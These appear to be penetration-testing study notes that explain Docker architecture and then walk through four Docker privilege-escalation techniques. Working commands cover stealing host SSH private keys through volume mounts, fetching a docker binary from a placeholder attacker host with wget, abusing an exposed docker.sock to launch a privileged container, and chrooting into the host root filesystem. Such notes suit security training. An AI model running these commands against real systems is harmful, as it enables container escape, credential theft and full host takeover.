# Docker & Docker PrivEsc

## Docker Basics
- Provides a portable, consistent runtime via **containers** — isolated, user-space environments at the OS level that share the host's file system and resources.
- Far lighter weight than a traditional VM/server.
- Applications are packaged into **Docker containers**: lightweight, standalone executables containing everything needed to run.

## Architecture — Client-Server Model

**Docker Daemon** (server) — the powerhouse:
- Runs, manages, and monitors containers, keeping them isolated (own filesystem, processes, network interfaces).
- Manages Docker **images** — pulls from registries (Docker Hub, private repos), stores locally.
- Provides logging/monitoring (container logs, resource usage: CPU/memory/network).
- Manages networking (virtual networks, ports, DNS) and storage (volumes for persisting data beyond container lifespan).

**Docker Client** — the interface:
- Issues commands to the daemon via REST API or Unix socket.
- Create/start/stop/remove containers; pull/build/push images.
- **Docker Compose** — a client tool for orchestrating multi-container apps via declarative YAML (services, dependencies, networking, volumes).

**Docker Desktop** — GUI client (macOS/Windows/Linux), supports Kubernetes.

## Images vs. Containers
- **Image** = read-only blueprint/template (code, dependencies, config). Built from a `Dockerfile`.
- **Container** = a running, mutable instance of an image — isolated filesystem/processes/network. Runtime changes aren't persisted unless saved as a new image or stored in a volume.

---

## Docker Privilege Escalation Techniques

### 1. Shared Directories (Volume Mounts)
- Volume mounts bridge host and container filesystems (persist data, share code, enable collaboration).
- Can be read-only or read-write depending on setup.
- **Attack:** Enumerate the container filesystem for non-standard mounted directories exposing host paths.

```bash
cd /hostsystem/home/cry0l1t3
ls -l
cat .ssh/id_rsa
```
- If a host user's private SSH key is exposed via the mount, copy it out and use it to SSH into the host as that user:
```bash
ssh cry0l1t3@<host_IP> -i cry0l1t3.priv
```

---

### 2. Docker Socket Access (`docker.sock` exposed in container)
- The Docker socket is the communication bridge between client and daemon (Unix or network socket).
- Should be restricted to trusted users/groups — but sometimes it's accessible inside a container.

**Enumerate socket presence:**
```bash
ls -al
# srw-rw---- 1 root root 0 Jun 30 15:27 docker.sock
```

**Get the `docker` binary if not present** (download/upload to container):
```bash
wget https://<attacker-host>:443/docker -O docker
chmod +x docker
```

**Use the socket to list running containers:**
```bash
/tmp/docker -H unix:///app/docker.sock ps
```

**Escape via privileged container mounting host root:**
```bash
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
```

**Exec into the new privileged container:**
```bash
/tmp/docker -H unix:///app/docker.sock exec -it <container_id> /bin/bash
```

**Access host files as root:**
```bash
cat /hostsystem/root/.ssh/id_rsa
```
→ Grab root's (or any user's) private key to SSH into the host directly.

---

### 3. Docker Group Membership (on the host, not in a container)
- To control the Docker daemon directly, the user must be in the **`docker` group** (or Docker has SUID set, or user has sudo rights to run docker).

**Check group membership:**
```bash
id
# groups=1000(docker-user),116(docker)
```

**Enumerate available images:**
```bash
docker image ls
```

> Note: hosts with Docker often need internet access to pull images, but may be disconnected outside working hours for security — though still reachable if positioned behind something like a web server.

---

### 4. Writable Docker Socket (`/var/run/docker.sock`)
- Normally only writable by `root` or the `docker` group.
- If misconfigured to be writable by a non-privileged user, it can still be exploited.

**Mount host root into a new container and chroot into it:**
```bash
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```
→ Drops into a root shell with the **entire host filesystem** as the container's root — full host compromise.

---

## Key Takeaway
Any of the following on a host effectively equals **root-level access via Docker**:
- Membership in the `docker` group
- Docker binary with SUID set
- Sudo rights to run `docker`
- A writable/reachable `docker.sock` (host or container-side)
- Exposed host directories via volume mounts containing sensitive files (SSH keys, etc.)